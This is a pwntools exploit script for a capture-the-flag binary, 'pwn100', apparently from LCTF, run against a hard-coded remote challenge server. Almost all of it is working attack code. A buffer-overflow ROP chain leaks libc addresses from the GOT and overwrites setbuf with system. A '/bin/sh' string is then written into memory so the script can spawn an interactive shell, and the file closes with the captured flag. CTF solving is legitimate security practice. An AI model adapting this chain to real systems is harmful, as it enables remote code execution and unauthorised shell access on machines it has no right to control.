from pwn import *
context(log_level="debug")

# p =  process("./pwn100")
p = remote('119.28.63.211',2332)
elf = ELF("./pwn100")
puts_got = elf.got["puts"]
read_got = elf.got["read"]
puts_plt = elf.symbols["puts"]
setbuf_got = elf.got["setbuf"]
juck = "a"*0x48
pppppret_rop = 0x40075A
mov_args_rop = 0x400740
main_addr = 0x40068E
data_addr = 0x601040
def leak(addr):
	payload = juck + p64(pppppret_rop)+p64(0)+p64(1)+p64(puts_got)+p64(0)+p64(0)+p64(addr)+p64(mov_args_rop)
	payload += p64(0)*7+p64(main_addr)
	payload += '\x00'*(200-len(payload))
	p.send(payload)
	sleep(1)
	p.recvuntil("bye~\n")
	data = p.recvuntil('\n')

	if data[:-1] == '':
		return '\x00'
	else:
		return data[:-1]
def write(addr,byte,n):
	payload = juck + p64(pppppret_rop)+p64(0)+p64(1)+p64(read_got)+p64(n)+p64(addr)+p64(0)+p64(mov_args_rop)
	payload += p64(0)*7+p64(main_addr)
	payload += '\x00'*(200-len(payload))
	p.send(payload)
	sleep(1)
	p.recvuntil("bye~\n")
	p.send(byte)

puts_addr = u64(leak(puts_got).ljust(8,'\x00'))
print 'puts_addr = ' + hex(puts_addr)
read_addr = u64(leak(read_got).ljust(8,'\x00'))
print 'read_addr = ' + hex(read_addr)
system_offset = 0x00070c70 - 0x000468f0
system_addr = puts_addr - system_offset

# gdb.attach(p,"b*0x4006B6\nc")

write(setbuf_got,p64(system_addr),8)
write(data_addr,'/bin/sh\0',8)
payload = juck + p64(pppppret_rop)+p64(0)+p64(1)+p64(setbuf_got)+p64(0)+p64(0)+p64(data_addr)+p64(mov_args_rop)
payload += p64(0)*7+p64(main_addr)
payload += '\x00'*(200-len(payload))
p.send(payload)

### why?????
# d = DynELF(leak, elf=ELF('./pwn100'))
# system_addr = d.lookup('execve', 'libc')
# print 'system_addr = '+hex(system_addr)
p.interactive()


## LCTF{mEmC8i60xY3zhTMY/PD5zaqv7kuw}